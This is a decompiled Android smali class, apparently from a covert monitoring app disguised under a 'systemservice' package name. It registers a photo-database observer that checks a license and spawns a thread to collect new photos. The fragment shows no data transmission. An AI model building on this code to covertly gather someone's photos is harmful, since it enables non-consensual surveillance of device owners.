.class Lcom/systemservice/a/c/g/c;
.super Landroid/database/ContentObserver;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/b/a;Landroid/net/Uri;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Landroid/net/Uri;

.field final synthetic c:Lcom/systemservice/a/b/a;

.field final synthetic d:Lcom/systemservice/a/c/g/d;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/g/d;Landroid/os/Handler;Landroid/content/Context;Landroid/net/Uri;Lcom/systemservice/a/b/a;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    iput-object p3, p0, Lcom/systemservice/a/c/g/c;->a:Landroid/content/Context;

    iput-object p4, p0, Lcom/systemservice/a/c/g/c;->b:Landroid/net/Uri;

    iput-object p5, p0, Lcom/systemservice/a/c/g/c;->c:Lcom/systemservice/a/b/a;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public onChange(Z)V
    .locals 7

    const-string p1, "is_active = false"

    const-string v0, "AndroidPhotoWatcher"

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/a/c/g/c;->a:Landroid/content/Context;

    invoke-static {v1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v2, "ts_photo"

    if-eqz v1, :cond_0

    :try_start_1
    iget-object p1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {p1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object p1

    const-string v1, "CheckLicenseExpired = true"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string p1, "checkLicenseExpired = true"

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    iget-object v1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v1}, Lcom/systemservice/a/c/g/d;->c(Lcom/systemservice/a/c/g/d;)Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v1

    invoke-virtual {v1, p1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_1
    new-instance p1, Ljava/util/Date;

    invoke-direct {p1}, Ljava/util/Date;-><init>()V

    invoke-virtual {p1}, Ljava/util/Date;->getTime()J

    move-result-wide v1

    iget-object p1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {p1}, Lcom/systemservice/a/c/g/d;->d(Lcom/systemservice/a/c/g/d;)J

    move-result-wide v3

    const-wide/16 v5, 0x0

    cmp-long p1, v3, v5

    if-nez p1, :cond_2

    iget-object p1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {p1, v1, v2}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;J)J

    :cond_2
    iget-object p1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {p1}, Lcom/systemservice/a/c/g/d;->d(Lcom/systemservice/a/c/g/d;)J

    move-result-wide v3

    sub-long v3, v1, v3

    cmp-long p1, v3, v5

    if-lez p1, :cond_3

    const-wide/16 v5, 0x1388

    cmp-long p1, v3, v5

    if-gtz p1, :cond_3

    const-string p1, "diffTime > 0) && (diffTime <= TIME_AGO * 1000 "

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {p1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object p1

    const-string v1, "diffTime > 0) && (diffTime <= TIME_AGO * 1000"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_3
    iget-object p1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {p1, v1, v2}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;J)J

    iget-object p1, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {p1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object p1

    const-string v1, "Count again. and continue to get photo from database"

    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string p1, "count again. and continue to get photo from database"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance p1, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/a/c/g/b;

    invoke-direct {v1, p0}, Lcom/systemservice/a/c/g/b;-><init>(Lcom/systemservice/a/c/g/c;)V

    invoke-direct {p1, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v0}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_0
    return-void
.end method
